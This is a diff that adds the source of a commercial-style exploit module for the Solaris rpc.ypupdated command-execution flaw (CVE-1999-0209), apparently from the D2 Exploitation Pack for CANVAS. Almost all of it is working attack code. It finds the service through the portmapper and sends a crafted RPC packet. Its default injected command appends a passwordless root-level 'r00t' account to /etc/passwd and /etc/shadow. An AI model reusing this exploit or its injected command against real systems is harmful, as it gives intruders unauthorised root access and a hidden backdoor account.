@@ -1,0 +1,123 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import os,getopt
+import sys
+sys.path.append(".")
+sys.path.append("../../")
+
+import socket
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+from sunrpc import *
+
+DOCUMENTATION={}
+DOCUMENTATION["Date public"] = "2008-03-20"
+DOCUMENTATION["CVE Name"] = "1999-0209"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=1999-0209"
+DOCUMENTATION["Reference"] = "http://www.securityfocus.com/bid/1749/info"
+
+DESCRIPTION = "Solaris <= 10 rpc.ypupdated Command Execution Vulnerability"
+NAME = "Solaris ypupdated Command Execution"
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Solaris"] ]
+
+GTK2_DIALOG="dialog.glade2"
+
+NOTES=""" 
+Solaris rpc.ypupdated has to be started with the -i option to cause this
+exploit work.
+
+Tested on Solaris 9 sparc and Solaris 10 x86.
+"""
+
+YPUPDATE_PROGRAM = 100028
+YPUPDATE_PROTO = "udp"
+YPUPDATE_VERSION = 1
+YPUPDATE_PROCEDURE = 1
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.name = NAME        
+		self.host = ""
+		self.port = 0
+		self.attackhost = "localhost"
+		self.command = "|echo \"r00t::0:0:root:/:/sbin/sh\" >> /etc/passwd;echo \"r00t::6445::::::\" >> /etc/shadow;"
+		return
+
+	def run(self):
+		self.host = self.target.interface
+		self.command = self.argsDict.get("command",self.command)
+
+		self.setInfo("%s attacking %s"%(NAME,self.host))
+
+		port = self.port
+
+		if port == 0:
+			try:
+				self.log("[D2 LOG] Going to portmapper to find port...")
+				port = SRPCgetport(self.host, YPUPDATE_PROGRAM, YPUPDATE_VERSION, YPUPDATE_PROTO)
+				self.log("[D2 LOG] Portmapper query returned %d" % port)
+			except:
+				pass
+
+		if port == 0 or port == None:
+			self.log("[D2 LOG] Not able to automatically get the port.")
+			self.setInfo("%s attacking %s (failed)"%(NAME,self.host))
+			return 0
+
+		self.port = int(port)
+
+		try:
+			s = self.getudpsock()
+			s.connect((self.host, self.port))
+			s.send(self.makesploit())
+		except:
+			import traceback
+			traceback.print_exc(file=sys.stdout)
+			self.log("[D2 LOG] Attack reported no open socket or some othe error - service not available?")
+			self.setInfo("%s attacked %s:%d (failed)"%(NAME,self.host,self.port))
+			return 0
+     
+		time.sleep(2)
+	
+		self.log("[D2 LOG] Command '%s' executed" % self.command)
+		self.setInfo("%s attacking %s:%d (succeded)"%(NAME,self.host,self.port))
+		return 1
+    
+	def makesploit(self):
+		sploitstring = ""
+       
+		sploitstring += SRPCCallHeaderUDP_UNIX(YPUPDATE_PROGRAM, YPUPDATE_VERSION, YPUPDATE_PROCEDURE, self.attackhost)
+		sploitstring += "\x00" * 3
+		sploitstring += "\x69"
+		sploitstring += self.command
+		sploitstring += "\x00" * 6
+		sploitstring += "\x02\x78"
+		sploitstring += "\x00" * 6
+		sploitstring += "\x02\x78"
+		sploitstring += "\x00" * 3
+
+		return sploitstring
+
+		def usage(self):
+			print "Usage: "+sys.argv[0]+" -t target [-O command:command]"
+
+			sys.exit()
+
+if __name__ == '__main__':
+    print "Running CANVAS "+NAME+" version "+VERSION
+    app = theexploit()
+    ret = standard_callback_commandline(app)
